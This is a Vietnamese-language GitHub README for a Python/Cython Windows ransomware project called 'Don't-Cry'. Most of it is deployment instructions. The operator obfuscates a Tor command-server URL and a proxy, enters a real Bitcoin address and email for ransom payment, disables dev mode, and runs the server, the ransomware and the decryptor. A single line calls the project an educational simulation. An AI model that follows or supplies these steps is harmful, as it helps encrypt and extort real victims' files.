# Don't-Cry Ransomware
![Python](https://img.shields.io/badge/Python-3.12%2B-blue?logo=python\&logoColor=white)
![Cython](https://img.shields.io/badge/Requires-Cython-yellow?logo=python\&logoColor=white)
![License](https://img.shields.io/github/license/memecoder12345678/DCry-Ransomware?style=flat\&logo=open-source-initiative\&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Windows-blue)
![Status](https://img.shields.io/badge/Status-Temporarily--Inactive-orange)
![DCry](https://github.com/memecoder12345678/DCry-Ransomware/blob/main/imgs/DCRY.png)
Ransomware viết bằng Python 💀💀💀
## Cách sử dụng
* Mở file [`DCry.py`](https://github.com/memecoder12345678/DCry-Ransomware/blob/main/src/DCry.py).
* Thay biến `YOUR_URL` bằng URL đã mã hóa sử dụng hàm `dx42` như sau:
  ```python
  YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()
  ```
  (Trước đó dùng hàm `ex42` từ module `edx42` để mã hóa URL.)
  
  Ví dụ:
  ```python
  encoded_url = ex42(b"https://your-tor-server.onion")
  YOUR_URL = dx42(encoded_url).decode()
  ```
* Thay biến `YOUR_PROXY` tương tự với proxy đã mã hóa:
  ```python
  YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode()
  ```
* Thay `YOUR_BITCOIN_ADDRESS` bằng địa chỉ Bitcoin thật của bạn.
* Thay `YOUR_EMAIL_ADDRESS` bằng địa chỉ email thật của bạn.
* Đặt `dev_mode = False` để tắt chế độ phát triển.
* Cài đặt các thư viện cần thiết với lệnh:
  ```bash
  pip install -r requirements.txt
  ```
* Biên dịch mã Cython bằng lệnh:
  ```bash
  python src/setup.py build_ext --inplace
  ```
* Chạy server với lệnh:
  ```bash
  python src/server.py
  ```
* Chạy ransomware với lệnh:
  ```bash
  python src/DCRY.py
  ```
* Chạy công cụ giải mã với lệnh:
  ```bash
  python src/decryptor.py
  ```
## Cảnh báo
> \[!WARNING]
> Dự án này là mô phỏng ransomware chỉ phục vụ mục đích giáo dục.
## Giấy phép
* Dự án này được cấp phép theo [Apache License 2.0](./LICENSE).
